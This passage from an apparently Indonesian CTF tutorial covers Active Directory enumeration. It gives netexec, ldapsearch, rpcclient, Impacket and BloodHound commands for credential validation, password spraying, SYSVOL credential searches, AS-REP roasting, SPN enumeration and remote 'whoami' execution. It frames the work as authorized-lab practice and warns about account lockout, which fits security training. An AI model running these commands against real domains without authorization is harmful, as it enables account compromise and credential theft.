> Sekarang tujuan berubah:
> 
> ```text
> "What does a normal domain user have access to?"
> ```

---

# 3.1 ✅ Validasi Credentials

## Basic SMB Authentication

```bash
# Test the discovered domain credentials against SMB
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD"
```

Representative success:

```text
SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 17763 x64
SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\svc_backup:LAB_PASSWORD
```

---

# 🧠 `[+]` Artinya

```text
authentication succeeded
```

Tetapi:

```text
authenticated
≠
admin
```

---

# Local Admin vs Domain User

Test:

```bash
# Check administrative access to the host
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -x "whoami"
```

Interpretasi:

```text
domain user
```

tidak otomatis:

```text
local administrator
```

Pada CTF, credentials yang valid pada DC hanya membuktikan authentication terhadap target/service tersebut.

---

# Password Spray — CTF Only

Jika lab memang meminta password spraying:

```bash
# Test one known lab password against a small authorized user list
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u users.txt \
  -p 'LAB_PASSWORD' \
  --continue-on-success
```

⚠️ Perhatikan:

```text
account lockout
password policy
number of attempts
```

Jangan langsung:

```text
100 users × 100 passwords
```

---

# 3.2 👥 User Enumeration (Authenticated)

## GetADUsers

```bash
# Enumerate domain users using valid credentials
impacket-GetADUsers \
  "$DOMAIN/$USERNAME:$PASSWORD" \
  -all \
  -dc-ip "$DC_IP"
```

Representative:

```text
[*] Querying domain DC01.corp.local
Name                 Email                         PasswordLastSet
-------------------  ----------------------------  ------------------------
Administrator                                      2026-01-10
alice                alice@corp.local              2026-07-22
bob                  bob@corp.local                2026-08-01
svc_backup           svc_backup@corp.local         2026-03-02
```

---

# Save Output

```bash
# Save domain user enumeration
impacket-GetADUsers \
  "$DOMAIN/$USERNAME:$PASSWORD" \
  -all \
  -dc-ip "$DC_IP" \
  | tee ~/labs/ad/users/getadusers.txt
```

---

# LDAP Authenticated

```bash
# Perform an authenticated LDAP search
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectCategory=person)" \
  sAMAccountName userPrincipalName description memberOf
```

---

# Sort Usernames

```bash
# Extract usernames from LDAP output
grep '^sAMAccountName:' ~/labs/ad/users/getadusers.txt \
  | awk '{print $2}' \
  | sort -u \
  > ~/labs/ad/users/usernames.txt

# Display sorted usernames
cat ~/labs/ad/users/usernames.txt
```

---

# 🧠 Kenapa Export & Sort?

Karena file asli mungkin:

```text
hundreds of lines
```

Sedangkan Anda membutuhkan:

```text
alice
bob
svc_backup
administrator
```

Jadi:

```text
raw output
 ↓
normalize
 ↓
sort
 ↓
wordlist
```

---

# 3.3 👥 Group Enumeration

## Default Groups Penting

|Group|Kenapa Penting|
|---|---|
|Domain Admins|Administrative control domain|
|Enterprise Admins|Forest-level privileges|
|Account Operators|Account management capabilities|
|Backup Operators|Backup/restore related privileges|
|Remote Management Users|Remote management access|
|DNS Admins|DNS administrative capabilities|
|Server Operators|Server administration privileges|
|Administrators|Local/domain administrative context|

> Membership dan privilege nyata dapat dipengaruhi nested groups, ACL, delegated permissions, GPO, dan host-specific configuration. Jangan hanya melihat nama group.

---

# Enumerate Groups

```bash
# Enumerate groups using LDAP
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectClass=group)" \
  sAMAccountName description member
```

---

# NXC Domain Enumeration

```bash
# Enumerate domain users
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  --users

# Enumerate domain groups where supported by the installed NXC version
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  --groups
```

---

# Check Specific Group Membership

LDAP:

```bash
# Search for Domain Admins membership information
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(&(objectClass=group)(sAMAccountName=Domain Admins))" \
  member
```

Representative:

```text
member: CN=Administrator,CN=Users,DC=corp,DC=local
member: CN=Alice Admin,CN=Users,DC=corp,DC=local
```

---

# Parse Membership

Misalnya:

```text
member: CN=Alice Admin,CN=Users,DC=corp,DC=local
```

Maka:

```text
Alice Admin
```

adalah member langsung.

Tetapi belum tentu:

```text
direct Domain Admin
```

karena nested group bisa menghasilkan privilege transitive.

---

# 3.4 💻 Computer Enumeration

## Tujuan

Cari:

```text
DC
member servers
workstations
file servers
SQL servers
web servers
management servers
```

---

# LDAP

```bash
# Enumerate computer objects
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectCategory=computer)" \
  dNSHostName sAMAccountName operatingSystem operatingSystemVersion
```

---

# Contoh Output

```text
dn: CN=DC01,OU=Domain Controllers,DC=corp,DC=local
dNSHostName: DC01.corp.local
sAMAccountName: DC01$
operatingSystem: Windows Server 2019 Standard
operatingSystemVersion: 10.0 (17763)

dn: CN=WEB01,OU=Servers,DC=corp,DC=local
dNSHostName: WEB01.corp.local
sAMAccountName: WEB01$
operatingSystem: Windows Server 2019 Standard

dn: CN=WS01,OU=Workstations,DC=corp,DC=local
dNSHostName: WS01.corp.local
sAMAccountName: WS01$
operatingSystem: Windows 10 Pro
```

---

# 🧠 Identify DC

Strong indicator:

```text
OU=Domain Controllers
```

Example:

```text
CN=DC01,OU=Domain Controllers,...
```

→ highly likely Domain Controller.

---

# Identify Workstation

```text
Windows 10
Windows 11
```

plus:

```text
Workstations OU
```

→ likely workstation.

---

# Identify Member Server

```text
Windows Server
```

but:

```text
OU != Domain Controllers
```

→ likely member server.

Tetap verify melalui network services.

---

# NXC

```bash
# Enumerate domain computers if supported by installed NXC version
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  --computers
```

---

# 3.5 📂 Share Enumeration

## NXC

```bash
# Enumerate SMB shares with valid credentials
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  --shares
```

---

# SMBClient

```bash
# List shares using authenticated credentials
smbclient -L "//$DC_IP/" \
  -U "$DOMAIN/$USERNAME%$PASSWORD"
```

---

# Connect

```bash
# Open the NETLOGON share
smbclient "//$DC_IP/NETLOGON" \
  -U "$DOMAIN/$USERNAME%$PASSWORD"
```

---

# Recursive Enumeration

Di `smbclient`:

```text
smb: \> recurse ON
smb: \> ls
```

Download file lab:

```text
smb: \> get script.ps1
```

---

# smbmap

```bash
# Enumerate shares and permissions
smbmap \
  -H "$DC_IP" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -d "$DOMAIN"
```

---

# Mount Share di Linux

Install CIFS:

```bash
# Install CIFS mount support
sudo apt update
sudo apt install -y cifs-utils
```

Create mount point:

```bash
# Create a mount directory
mkdir -p ~/labs/ad/mnt/sysvol
```

Mount:

```bash
# Mount the lab SYSVOL share
sudo mount -t cifs \
  "//$DC_IP/SYSVOL" \
  ~/labs/ad/mnt/sysvol \
  -o "username=$USERNAME,password=$PASSWORD,domain=$DOMAIN"
```

Unmount:

```bash
# Unmount the lab share when finished
sudo umount ~/labs/ad/mnt/sysvol
```

---

# 🔎 Apa yang Dicari?

Cari:

```text
password
passwd
secret
credential
token
apikey
connection string
*.config
*.xml
*.ps1
*.bat
*.cmd
*.ini
```

Contoh:

```bash
# Search lab share contents for common credential-related words
grep -RniE 'password|passwd|secret|token|apikey|credential' \
  ~/labs/ad/mnt/sysvol 2>/dev/null
```

---

# ⚠️ Jangan Asumsikan String = Credential

Misalnya:

```text
password policy
```

bukan:

```text
password = Secret123
```

Gunakan:

```text
context
file type
value
who uses it
```

---

# 3.6 🔐 Password Policy

## Kenapa Penting?

Sebelum brute force/password spraying, cari:

```text
Minimum password length
Password history
Lockout threshold
Lockout duration
Complexity
```

---

# LDAP

Beberapa domain policy information dapat ditemukan melalui LDAP.

```bash
# Query common domain password policy attributes
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  -s base \
  minPwdLength lockoutThreshold lockoutDuration pwdHistoryLength
```

---

# RPC

```bash
# Connect authenticated to RPC
rpcclient \
  -U "$DOMAIN\\$USERNAME%$PASSWORD" \
  "$DC_IP"
```

Kemudian:

```text
rpcclient $> getdompwinfo
```

Representative:

```text
min_password_length: 8
password_history: 24
lockout_threshold: 5
min_password_age: 1
max_password_age: 42
```

---

# 🧠 Analisis

### Minimum password length

```text
8
```

→ password minimum.

### Lockout threshold

```text
5
```

→ lima failed attempts dapat memicu lockout, tergantung policy.

### Lockout duration

Misalnya:

```text
30 minutes
```

→ lockout dapat bertahan selama periode tersebut.

---

# 🚨 Kenapa Ini Penting?

Misalnya:

```text
lockout threshold = 5
```

Jangan lakukan:

```text
50 passwords × 100 users
```

Karena bisa menyebabkan:

```text
mass account lockout
```

Lebih baik:

```text
one password
few users
observe
```

dan hanya di lab.

---

# 3.7 🏛️ GPO Enumeration

## Apa Itu GPO?

Group Policy Object adalah policy terpusat yang mengatur Windows domain environment.

Contoh:

```text
Password policy
Security settings
Software deployment
Scripts
Registry settings
Firewall
Restricted groups
```

Flow:

```text
Domain
 ↓
GPO
 ↓
Computer/User
 ↓
Policy
```

---

# PowerView

Pada Windows lab:

```text
Get-DomainGPO
```

Target tertentu:

```text
Get-DomainGPO -Properties DisplayName,GPCFileSysPath
```

Cari GPO yang berkaitan dengan:

```text
password
admin
startup
scripts
software
deployment
```

---

# Linux / LDAP

GPO objects dapat ditemukan melalui LDAP.

```bash
# Search Group Policy objects
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectClass=groupPolicyContainer)" \
  displayName gPCFileSysPath
```

---

# 🔥 GPP Credentials

Pada environment lama/misconfigured, file Group Policy Preferences tertentu pernah menjadi tempat penyimpanan credential material.

Cari:

```text
Groups.xml
ScheduledTasks.xml
Services.xml
Printers.xml
```

terutama di:

```text
SYSVOL
```

---

# Search

```bash
# Search the mounted SYSVOL for common GPP-related files
find ~/labs/ad/mnt/sysvol \
  -type f \
  \( -iname 'Groups.xml' \
     -o -iname 'ScheduledTasks.xml' \
     -o -iname 'Services.xml' \
     -o -iname 'Printers.xml' \)
```

---

# 🩸 BAGIAN 4 — FASE 3: BLOODHOUND DATA COLLECTION

> File 36 akan membahas BloodHound secara mendalam.
> 
> Di file ini kita hanya melakukan:
> 
> ```text
> collect
> ↓
> save
> ↓
> prepare for BloodHound
> ```
> 
> Bukan menganalisis attack path secara mendalam.

---

# 4.1 🪶 SharpHound dari Windows

## Tujuan

SharpHound mengumpulkan relationship seperti:

```text
Users
Groups
Computers
Sessions
ACLs
Trusts
GPO relationships
Local groups
```

Collection method umum:

```text
All
Default
DCOnly
Session
ACL
ObjectProps
Container
Trusts
```

---

# Basic Collection

Pada Windows lab:

```text
SharpHound.exe -c All
```

ZIP:

```text
SharpHound.exe -c All --zipfilename ad_collection.zip
```

---

# Collection Methods

```text
-c All
```

→ broad collection.

```text
-c DCOnly
```

→ domain controller-related collection.

```text
-c Session
```

→ session relationships.

```text
-c ACL
```

→ access control relationships.

```text
-c Trusts
```

→ trust relationships.

---

# 🧠 Kapan Pakai `All`?

CTF:

```text
-c All
```

sering paling mudah.

Tetapi di environment besar:

```text
All
```

dapat menghasilkan:

```text
lebih banyak network traffic
lebih banyak output
lebih banyak waktu
```

---

# 4.2 🐍 BloodHound.py dari Linux

Untuk BloodHound Community Edition, gunakan:

```text
bloodhound-ce-python
```

bukan legacy:

```text
bloodhound-python
```

Keduanya berbeda generation/compatibility.

---

# Install

```bash
# Install the BloodHound CE Python ingestor
sudo apt update
sudo apt install -y bloodhound-ce-python

# Verify the command
bloodhound-ce-python --help
```

---

# Basic Collection

```bash
# Collect all BloodHound CE data using domain credentials
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "$DC_IP" \
  -c All \
  --zip
```

---

# Dengan DNS Nameserver

Dalam beberapa lab, DNS target penting.

```bash
# Specify the DC as DNS server when the lab DNS requires it
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "$DC_IP" \
  -ns "$DC_IP" \
  -c All \
  --zip
```

---

# Output

Representative output:

```text
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 37 users
INFO: Found 19 groups
INFO: Found 18 computers
INFO: Found 6 gpos
INFO: Found 12 ous
INFO: Found 2 trusts
INFO: Starting computer enumeration
INFO: Done
INFO: Compressing output
```

Contoh modern BloodHound CE collection memang menghasilkan counts seperti users, groups, GPOs, OUs, containers, trusts dan ZIP output.

---

# 📦 Output Files

Cari:

```bash
# List BloodHound collection files in the current directory
ls -lh *bloodhound* *BloodHound* 2>/dev/null

# Find recent ZIP/JSON output
find . -maxdepth 2 \
  -type f \
  \( -name '*.zip' -o -name '*.json' \) \
  -printf '%TY-%Tm-%Td %TH:%TM %p\n' \
  | sort
```

Simpan original:

```bash
# Preserve the original BloodHound collection archive
cp ./*.zip ~/labs/ad/bloodhound/ 2>/dev/null
```

---

# 🧠 Kenapa Tidak Langsung Analisis di File 35?

Karena enumeration:

```text
File 35
```

menghasilkan:

```text
raw facts
```

sedangkan BloodHound:

```text
File 36
```

mengubah facts menjadi:

```text
relationships
attack paths
privilege escalation graph
```

---

# 🌳 BAGIAN 5 — DECISION TREE

```text
                         START
                           │
                           ▼
                 AD environment confirmed?
                     ┌─────┴─────┐
                    NO           YES
                    │             │
                    ▼             ▼
               Back to Nmap    FASE 1
                                  │
                 ┌────────────────┼─────────────────┐
                 │                │                 │
                 ▼                ▼                 ▼
            SMB Null         LDAP Anonymous     RPC Null
             Session              Bind             Session
                 │                │                 │
             ┌───┴───┐        ┌───┴───┐        ┌───┴───┐
            YES     NO        YES     NO       YES     NO
             │       │         │       │        │       │
             ▼       │         ▼       │        ▼       │
        Users/Shares │    Users/Groups │   Users/Groups│
        Policies     │                 │                │
             │       │                 │                │
             └───────┴─────────┬──────┴────────────────┘
                               │
                               ▼
                       Kerberos Enumeration
                               │
                               ▼
                      Valid usernames found?
                        ┌────────┴────────┐
                       NO                YES
                        │                  │
                        ▼                  ▼
                    Re-enumerate       GetNPUsers
                                           │
                                           ▼
                                  Pre-auth disabled?
                                      ┌────┴────┐
                                     NO        YES
                                      │          │
                                      ▼          ▼
                                   Need more   AS-REP hash
                                   avenues         │
                                                   ▼
                                               Crack offline
                                                   │
                                                   ▼
                                             Credentials?
                                           ┌─────┴─────┐
                                          NO          YES
                                           │             │
                                           ▼             ▼
                                      Continue      FASE 2
                                      enumeration       │
                                                       ▼
                                               Authenticated SMB
                                                       │
                                                       ▼
                                                Users / Groups
                                                       │
                                          ┌────────────┼────────────┐
                                          ▼            ▼            ▼
                                      Computers     Shares        GPO
                                          │            │            │
                                          └────────────┼────────────┘
                                                       │
                                                       ▼
                                                  SPNs / Trusts
                                                       │
                                                       ▼
                                            BloodHound Collection
                                                       │
                                                       ▼
                                                 FILE 36
```

---

# 🧩 BAGIAN 6 — COMMON SCENARIOS DI CTF

# SCENARIO 1 🎯 — HTB Easy AD Machine

Biasanya:

```text
one DC
one domain
few users
SMB
LDAP
Kerberos
one weak configuration
```

Pola:

```text
Nmap
 ↓
88/389/445
 ↓
domain discovery
 ↓
null session
 ↓
user enumeration
 ↓
AS-REP roast
 ↓
credentials
 ↓
authenticated enumeration
```

---

# Quick Wins yang Sering Ada

```text
anonymous SMB
anonymous LDAP
valid usernames
AS-REP roast
weak credentials
readable SYSVOL
interesting scripts
```

Tetapi jangan mengasumsikan setiap machine memiliki semua itu.

---

# SCENARIO 2 🔥 — HTB Medium AD Machine

Biasanya complexity meningkat:

```text
multiple servers
more users
service accounts
SPNs
ACLs
delegation
nested groups
multiple attack paths
```

Flow:

```text
Credentials pertama
       ↓
Enumerate
       ↓
Find service account
       ↓
SPN
       ↓
Kerberoasting
       ↓
More credentials
       ↓
ACL
       ↓
Privilege escalation
```

Pada level ini:

```text
"finding one password"
```

tidak cukup.

Anda perlu:

```text
relationship analysis
```

Itulah alasan BloodHound menjadi sangat penting.

---

# SCENARIO 3 🧪 — TryHackMe AD Room

Biasanya:

```text
guided
structured
educational
```

Pola:

```text
Scan
 ↓
Domain
 ↓
SMB
 ↓
LDAP
 ↓
Kerberos
 ↓
Credential
 ↓
Enumeration
 ↓
Privilege escalation
```

Karena room lebih guided, gunakan kesempatan untuk menghafalkan:

```text
command
output
meaning
next step
```

Bukan hanya mengejar flag.

---

# 🧯 BAGIAN 7 — COMMON ERRORS & TROUBLESHOOTING

|Error|Sebab|Solusi|
|---|---|---|
|`KDC_ERR_PREAUTH_FAILED`|Credential/password salah atau pre-auth gagal|Periksa username/password dan waktu|
|`KRB_AP_ERR_SKEW`|Clock attacker/DC terlalu jauh|Sinkronkan waktu dengan DC|
|`Connection refused`|Service tidak listening/firewall|Pastikan port dan target benar|
|`NT_STATUS_ACCESS_DENIED`|Anonymous/authenticated action tidak diizinkan|Gunakan credential atau metode lain|
|`NT_STATUS_LOGON_FAILURE`|Username/password salah|Validasi credential|
|`ldap_bind: Invalid credentials`|Bind DN/password salah|Gunakan UPN/domain format yang benar|
|`ldapsearch` tidak return data|Base DN/filter salah|Periksa RootDSE dan `defaultNamingContext`|
|LDAP anonymous RootDSE works, subtree tidak|Anonymous read dibatasi|Gunakan authenticated bind|
|`nxc` timeout|Network path/DNS/routing/filtering|Test `ping`, `nmap`, TCP connectivity|
|Kerbrute semua username invalid|Domain/DC salah atau DNS issue|Check realm/domain/DC resolution|
|`GetNPUsers` tidak menghasilkan hash|Tidak ada pre-auth-disabled account|Lanjut ke enumeration lain|
|`smbclient -L` gagal|Null session disabled|Coba authenticated session|
|`rpcclient` `ACCESS_DENIED`|Anonymous RPC disabled|Gunakan domain credentials|
|Impacket error karena Kerberos|SPN/DNS/time/realm problem|Check FQDN, DNS, clock|
|Impacket SSL/TLS error|LDAPS certificate validation issue|Coba LDAP biasa pada lab atau periksa CA|
|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Principal/user tidak ada|Check username/domain|
|`KDC_ERR_WRONG_REALM`|Realm/domain mismatch|Pastikan `$DOMAIN` dan DC benar|
|`clock skew too great`|System clock berbeda dari DC|Sinkronkan waktu|
|`STATUS_LOGON_FAILURE`|Password salah/expired|Revalidate credential|
|SYSVOL dapat dibuka tetapi file kosong|Permissions/filtering|Enumerate subdirectories|
|BloodHound CE import gagal|Collector/UI generation mismatch|Pastikan menggunakan CE-compatible collector|
|`bloodhound-python` membingungkan|Legacy tool|Gunakan `bloodhound-ce-python` untuk CE|
|SharpHound tidak menghasilkan semua data|Collection method/permissions|Uji `-c All` di lab dan periksa output|
|`nxc` command tidak ditemukan|NetExec belum terinstall|Install/check `$PATH`|
|`crackmapexec` command tidak ditemukan|Legacy package tidak ada|Gunakan `nxc`|
|`ldapsearch` command tidak ditemukan|LDAP client package belum ada|Install `ldap-utils`|

---

# ⏰ CLOCK SKEW — ERROR PALING PENTING PEMULA

Kerberos sangat sensitif terhadap waktu.

Misalnya:

```text
Attacker:
17:00:00

DC:
17:07:00
```

Perbedaan besar dapat menyebabkan:

```text
KRB_AP_ERR_SKEW
```

atau:

```text
Clock skew too great
```

---

# Cek Waktu

```bash
# Show attacker system time
date

# Show detailed system clock status
timedatectl

# Query the DC time through SMB/RPC tooling when supported
nmap -Pn -p 445 --script smb2-time "$DC_IP"
```

---

# Sinkronisasi untuk Lab

Jika Anda memiliki NTP access dari lab:

```bash
# Check NTP availability on the lab network
sudo ntpdate -q "$DC_IP"
```

Jika environment lab mengizinkan manual adjustment:

```bash
# Display current date before changing anything
date
```

> Jangan mengubah system clock production workstation secara sembarangan. Untuk CTF, lebih aman menggunakan VM khusus.

---

# 🧠 Clock Skew Mental Model

```text
Kerberos
   ↓
Timestamp-sensitive
   ↓
Attacker time
   ↕
DC time
   ↓
too different
   ↓
KRB_AP_ERR_SKEW
```

Jika Kerberos tiba-tiba gagal:

```text
BEFORE changing payload:
CHECK THE CLOCK.
```

---

# 🔌 Connection Refused

Contoh:

```text
ldapsearch: Can't contact LDAP server
```

Check:

```bash
# Confirm LDAP port is reachable
nmap -Pn -p 389 "$DC_IP"

# Confirm Kerberos port
nmap -Pn -p 88 "$DC_IP"

# Confirm SMB port
nmap -Pn -p 445 "$DC_IP"
```

Jika:

```text
389/tcp closed
```

→ jangan memaksa LDAP.

Jika:

```text
389/tcp filtered
```

→ network control mungkin memfilter.

---

# 🛑 NT_STATUS_ACCESS_DENIED

Artinya:

```text
server responded
+
authentication/authorization
=
operation denied
```

Bukan:

```text
server down
```

Gunakan:

```text
denied
↓
understand permission
↓
try authenticated enumeration
```

---

# 🐍 Impacket SSL Errors

Jika LDAPS bermasalah:

```text
certificate verify failed
TLS handshake
SSL error
```

Pertama:

```bash
# Check LDAPS availability
nmap -Pn -p 636 "$DC_IP"

# Check the LDAP service certificate using OpenSSL
openssl s_client -connect "$DC_IP:636" </dev/null
```

Analisis:

```text
certificate presented?
TLS handshake?
hostname mismatch?
```

Pada CTF, gunakan LDAP port `389` untuk enumeration jika lab memang mengizinkannya dan TLS bukan bagian challenge.

---

# 🔑 BAGIAN 8 — CHEATSHEET COMMANDS

# 🔴 Unauthenticated

## Port Discovery

```bash
# Scan common AD ports
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269 "$DC_IP"
```

---

## SMB

```bash
# Anonymous SMB share listing
smbclient -L "//$DC_IP/" -N

# Anonymous share enumeration
nxc smb "$DC_IP" -u '' -p '' --shares

# Legacy equivalent
crackmapexec smb "$DC_IP" --shares
```

---

## LDAP

```bash
# Query RootDSE anonymously
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -s base \
  -b "" \
  namingContexts defaultNamingContext rootDomainNamingContext

# Anonymous user search when allowed
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -b "$BASE_DN" \
  "(objectCategory=person)" \
  sAMAccountName
```

---

## RPC

```bash
# Anonymous RPC connection
rpcclient -U "" -N "$DC_IP"
```

Kemudian:

```text
# Enumerate domain users
enumdomusers

# Enumerate domain groups
enumdomgroups

# Show domain information
querydominfo
```

---

## enum4linux-ng

```bash
# Broad unauthenticated enumeration
enum4linux-ng -A "$DC_IP"

# Save output
enum4linux-ng -A "$DC_IP" | tee ~/labs/ad/recon/enum4linux-ng.txt
```

---

## Kerbrute

```bash
# Enumerate valid domain usernames
kerbrute userenum \
  --dc "$DC_IP" \
  -d "$DOMAIN" \
  users.txt
```

---

## AS-REP Roasting

```bash
# Request AS-REP material for a supplied username list
impacket-GetNPUsers "$DOMAIN/" \
  -dc-ip "$DC_IP" \
  -usersfile users.txt \
  -format hashcat \
  -outputfile ~/labs/ad/kerberos/asrep.txt \
  -no-pass
```

---

# 🟢 Authenticated

## Validate Credentials

```bash
# Test SMB authentication
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD"
```

---

## Shares

```bash
# Enumerate shares
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  --shares

# List shares with smbclient
smbclient -L "//$DC_IP/" \
  -U "$DOMAIN/$USERNAME%$PASSWORD"
```

---

## Users

```bash
# Enumerate users through Impacket
impacket-GetADUsers \
  "$DOMAIN/$USERNAME:$PASSWORD" \
  -all \
  -dc-ip "$DC_IP"

# Enumerate users through LDAP
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectCategory=person)" \
  sAMAccountName userPrincipalName description
```

---

## Groups

```bash
# Query all AD groups
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectClass=group)" \
  sAMAccountName member
```

---

## Computers

```bash
# Enumerate computer objects
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(objectCategory=computer)" \
  dNSHostName operatingSystem operatingSystemVersion
```

---

## SPNs

```bash
# Enumerate user SPNs with authenticated credentials
impacket-GetUserSPNs \
  "$DOMAIN/$USERNAME:$PASSWORD" \
  -dc-ip "$DC_IP"

# Query SPNs directly via LDAP
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  "(servicePrincipalName=*)" \
  sAMAccountName servicePrincipalName
```

---

## Password Policy

```bash
# Query common password policy attributes
ldapsearch -x \
  -H "ldap://$DC_IP" \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "$BASE_DN" \
  -s base \
  minPwdLength lockoutThreshold lockoutDuration pwdHistoryLength
```

RPC:

```bash
# Open authenticated RPC session
rpcclient \
  -U "$DOMAIN\\$USERNAME%$PASSWORD" \
  "$DC_IP"
```

Then:

```text
# Display domain password information
getdompwinfo
```

---

# 🩸 BloodHound CE

```bash
# Collect BloodHound CE data from Linux
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "$DC_IP" \
  -c All \
  --zip
```

---

# 🟠 Post-Compromise / Expanded Enumeration

Setelah memperoleh host credentials atau remote access, fokus enumeration dapat berkembang menjadi:

```text
Local users
Local groups
Services
Scheduled tasks
Installed software
PowerShell history
Credential stores
Registry
Shares
Sessions
Tokens
Delegated privileges
```

Contoh basic Windows inventory dari authorized lab melalui remote shell:

```bash
# Run a basic identity check through an authenticated SMB/remote execution mechanism available in the lab
nxc smb "$DC_IP" \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -x "whoami"
```

> Exact post-compromise execution capabilities depend on the account privileges and installed protocols. Jangan menganggap successful authentication sama dengan remote code execution.

---

# 🧠 BAGIAN 9 — GOLDEN RULES AD ENUM

## 🥇 Rule 01

```text
Port 445 ≠ automatically Domain Controller
```

Selalu correlate:

```text
88
389
3268
445
DNS
SMB domain metadata
LDAP RootDSE
```

---

## 🥇 Rule 02

```text
AD enumeration starts with identity, not exploitation.
```

Cari:

```text
domain
users
groups
computers
```

sebelum mencoba hal yang lebih agresif.

---

## 🥇 Rule 03

```text
Anonymous access is a hypothesis, not a guarantee.
```

Test:

```text
SMB
LDAP
RPC
```

secara terpisah.

---

## 🥇 Rule 04

```text
RootDSE success ≠ full anonymous LDAP access
```

Bedakan:

```text
RootDSE
```

dan:

```text
subtree enumeration
```

---

## 🥇 Rule 05

```text
Credentials pertama ≠ end goal.
```

Credentials pertama adalah:

```text
passport
```

menuju:

```text
authenticated enumeration
```

---

## 🥇 Rule 06

```text
Normal domain user can still be extremely valuable.
```

Karena mungkin dapat melihat:

```text
LDAP
SMB
GPO
groups
computers
SPNs
ACL relationships
```

---

## 🥇 Rule 07

```text
Always check the clock before blaming Kerberos.
```

Jika:

```text
KRB_AP_ERR_SKEW
```

cek:

```text
date
timedatectl
DC time
```

---

## 🥇 Rule 08

```text
Do not spray before checking password policy.
```

Cari:

```text
lockout threshold
```

dulu.

---

## 🥇 Rule 09

```text
Username ≠ credential
Credential ≠ admin
Admin on one host ≠ Domain Admin
```

Bedakan privilege scope.

---

## 🥇 Rule 10

```text
SPN ≠ automatically vulnerable
```

SPN hanya berarti:

```text
service identity exists
```

Lanjutkan dengan analysis.

---

## 🥇 Rule 11

```text
Group membership matters more than usernames.
```

Contoh:

```text
alice
```

kurang informatif dibanding:

```text
alice
 ↓
MemberOf
 ↓
Helpdesk
 ↓
nested group
 ↓
privileged group
```

---

## 🥇 Rule 12

```text
Save raw output.
```

Jangan hanya:

```text
read terminal
```

Simpan:

```text
enum4linux.txt
users.txt
groups.txt
ldap.txt
shares.txt
asrep.txt
bloodhound.zip
```

---

## 🥇 Rule 13

```text
One change at a time.
```

Jika command gagal:

```text
don't change five variables
at once.
```

Debug:

```text
DNS
→ network
→ authentication
→ authorization
→ command
```

---

## 🥇 Rule 14

```text
BloodHound is not the starting point.
```

BloodHound membutuhkan:

```text
quality data
```

Data buruk:

```text
garbage in
→
misleading graph
```

---

## 🥇 Rule 15

```text
Enumeration answer should create the next question.
```

Contoh:

```text
Found DC
 ↓
What domain?

Found domain
 ↓
What users?

Found users
 ↓
Any AS-REP roastable accounts?

Got credentials
 ↓
What can this user access?

Found computers
 ↓
What relationships exist?

BloodHound
 ↓
What is the shortest attack path?
```

---

# ✅ BAGIAN 10 — FINAL ENUMERATION CHECKLIST

```text
[ ] 01. Target is authorized
[ ] 02. Target IP recorded
[ ] 03. Host discovery completed
[ ] 04. Port 88 checked
[ ] 05. Port 389 checked
[ ] 06. Port 445 checked
[ ] 07. Port 3268/3269 checked
[ ] 08. DNS service identified
[ ] 09. Domain Controller hypothesis created
[ ] 10. SMB metadata inspected
[ ] 11. Domain name identified
[ ] 12. NetBIOS name identified
[ ] 13. DC hostname identified
[ ] 14. OS version identified
[ ] 15. SMB signing status recorded
[ ] 16. LDAP RootDSE queried
[ ] 17. Base DN recorded
[ ] 18. Anonymous LDAP tested
